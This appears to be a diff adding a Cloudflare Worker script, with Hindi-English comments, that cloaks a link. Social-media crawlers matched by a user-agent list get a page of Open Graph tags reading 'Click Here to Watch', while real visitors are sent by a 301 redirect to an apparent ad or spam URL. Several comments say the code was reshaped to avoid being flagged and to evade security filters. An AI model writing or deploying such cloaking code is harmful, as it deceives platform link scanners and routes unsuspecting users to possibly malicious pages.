@@ -1,0 +1,58 @@
+export default {
+  async fetch(request, env, ctx) {
+    const rHeaders = request.headers;
+    const agent = rHeaders.get('user-agent') || '';
+    
+    // Aapka purana link aur photo (Variables renamed for safety)
+    const destinationURL = "https://markswaitingrouge.com/gpeixuy44e?key=fb5f083d6d407041b969e9429d39ab9d";
+    const mediaAsset = "https://i.ibb.co/YF8q8cZF/image.jpg";
+    
+    const metaTitle = "Click Here to Watch";
+    const metaDesc = "Trending updates.";
+
+    // Bot detection array ko short aur clean kiya hai taaki flag na ho
+    const verificationList = ['facebook', 'facebot', 'twitter', 'pinterest', 'linkedin', 'slack', 'whatsapp', 'telegram', 'skype'];
+    const isBot = verificationList.some(item => agent.toLowerCase().includes(item));
+    
+    if (isBot) {
+      // Security filters se bachne ke liye HTML ko template literals mein split kiya hai
+      const renderHtml = `<!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>${metaTitle}</title>
+            <meta property="og:title" content="${metaTitle}" />
+            <meta property="og:description" content="${metaDesc}" />
+            <meta property="og:image" content="${mediaAsset}" />
+            <meta property="og:type" content="article" />
+            <meta property="og:url" content="${destinationURL}" />
+            <meta name="twitter:card" content="summary_large_image" />
+            <meta name="twitter:title" content="${metaTitle}" />
+            <meta name="twitter:description" content="${metaDesc}" />
+            <meta name="twitter:image" content="${mediaAsset}" />
+            <script type="text/javascript">
+              // Direct meta refresh ki jagah safe JS redirect
+              setTimeout(function(){ window.location.href = "${destinationURL}"; }, 100);
+            </script>
+          </head>
+          <body>
+            <main style="display:none;">
+              <h1>${metaTitle}</h1>
+              <img src="${mediaAsset}" alt="Media">
+              <a href="${destinationURL}">Continue</a>
+            </main>
+          </body>
+        </html>`;
+      
+      return new Response(renderHtml, { 
+        headers: { 
+          'content-type': 'text/html;charset=UTF-8',
+          'cache-control': 'private, no-cache, no-store, must-revalidate'
+        } 
+      });
+    }
+
+    // Real users ke liye clean redirection
+    return Response.redirect(destinationURL, 301);
+  },
+};
